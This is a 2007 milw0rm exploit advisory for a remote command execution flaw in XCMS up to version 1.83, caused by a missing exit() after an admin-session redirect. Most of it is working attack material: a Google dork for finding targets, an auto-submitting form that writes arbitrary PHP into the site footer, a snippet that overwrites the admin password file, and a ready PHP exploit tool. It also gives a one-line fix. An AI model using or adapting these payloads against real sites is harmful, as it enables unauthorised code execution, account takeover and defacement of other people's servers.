<html><head><title>XCMS <= 1.83 Remote Command Execution Exploit</title></head><pre>Name            :  XCMS &lt;= v1.83 Remote Command Execution Vulnerability
Author          :  x0kster
Email           :  x0kster@gmail.com
Site            :  ihteam.net
Script Download :  http://www.xcms.it
Date            :  28/12/2007
Dork            :  inurl:&quot;mod=notizie&quot;

The xcms's footer(that is in &quot;/dati/generali/footer.dtb&quot;) is included in each page of the xcms.
Taking &quot;home.php&quot; for example:
 
       &lt;?php
         //home.php
         [...]
         include(CSTR.&quot;footer&quot;.STR); // &lt;- &quot;CSTR&quot; and &quot;STR&quot; are the constants previously declared. They refers to &quot;/dati/generali&quot; and &quot;dtb&quot;
       ?&gt;

So the xcms allow you to modify the footer throught a bugged page called cpie.php included in the admin panel.
So let's take a look to the bugged code.

       &lt;?php
         //cpie.php
         [...]
         if(isset($_SESSION['logadmin'])===false){ header(&quot;location:index.php&quot;); } // &lt;- so miss an exit() :-D
         [...]
         if(isset($_POST['salva'])){
            Scrivi(CGEN.&quot;footer&quot;.DTB,stripslashes($_POST['testo_0'])); // &lt;- save the changements without any kind of control
         } 
         [...]
       ?&gt;
       
So with a simple html form we can change the footer.
Ex:

        &lt;form name=&quot;editor&quot; action=&quot;http://[SITE_WITH_XCMS]/index.php?lng=it&amp;amp;pg=admin&amp;amp;s=cpie&quot; method=&quot;post&quot;&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;salva&quot; value=&quot;OK&quot; /&gt;
        &lt;textarea name=&quot;testo_0&quot;&gt;&lt;?php YOUR PHP CODE ?&gt;&lt;/textarea&gt;
        &lt;input type=&quot;submit&quot; value=&quot;Modifica&quot; /&gt;
        &lt;/form&gt;
        &lt;script&gt;document.editor.submit()&lt;/script&gt;
        
        Note: This is NOT a CSRF, this is just an example to change the footer without the admin credentials.
 
 
       
Trick: We can change the admin panel password by inserting this code in the footer:
      
       &lt;?php
       $pwd = &quot;owned&quot;; // &lt;- Place here your new password.
       $pwd2 = md5($pwd);
       unlink(&quot;dati/generali/pass.php&quot;);
	   $f = fopen(&quot;dati/generali/pass.php&quot;,w);
       fwrite($f,&quot;&lt;?php \$mdp = \&quot;$pwd2\&quot;; ?&gt;&quot;);
       fclose($f);
       ?&gt;
       
This code delete the old password file and then create a new one with your new password.


Fix:
  
        &lt;?php
         //cpie.php
         [...]
         if(isset($_SESSION['logadmin'])===false){ header(&quot;location:index.php&quot;); exit(); } // with an exit() we can fix the bug.
         [...]
         if(isset($_POST['salva'])){
            Scrivi(CGEN.&quot;footer&quot;.DTB,stripslashes($_POST['testo_0'])); // &lt;- save the changements without any kind of control
         } 
         [...]
       ?&gt;

So this is a simple exploit:


&lt;?php
if(isset($_POST['send']) and isset($_POST['code']) and isset($_POST['site'])){
echo &quot;
&lt;form name=\&quot;editor\&quot; action=\&quot;http://&quot;.$_POST['site'].&quot;/index.php?lng=it&amp;amp;pg=admin&amp;amp;s=cpie\&quot; method=\&quot;post\&quot;&gt;
&lt;input type=\&quot;hidden\&quot; name=\&quot;salva\&quot; value=\&quot;OK\&quot; /&gt;
&lt;textarea name=\&quot;testo_0\&quot;&gt;&quot;.$_POST['code'].&quot;&lt;/textarea&gt;
&lt;input type=\&quot;submit\&quot; value=\&quot;Modifica\&quot; /&gt;
&lt;/form&gt;
&lt;script&gt;document.editor.submit()&lt;/script&gt;&quot;;
}else{
echo&quot;
&lt;pre&gt;
XCMS &lt;= v1.82 Remote Command Execution Vulnerability
Dork  :  inurl:\&quot;mod=notizie\&quot;
by x0kster
Visit ihteam.net
&lt;/pre&gt;
&lt;form method=POST action=&quot;.$_POST['PHP_SELF'].&quot;&gt;
&lt;pre&gt;
Site     :
&lt;input type=text name=site /&gt;
Code     :
&lt;textarea name=code cols=49 rows=14&gt;Your code here&lt;/textarea&gt;
&lt;input type=submit value=Exploit /&gt;
&lt;input type=hidden name=\&quot;send\&quot; /&gt;
&lt;/pre&gt;
&lt;/form&gt;&quot;;	  
}		
?&gt;

# milw0rm.com [2007-12-30]</pre></html>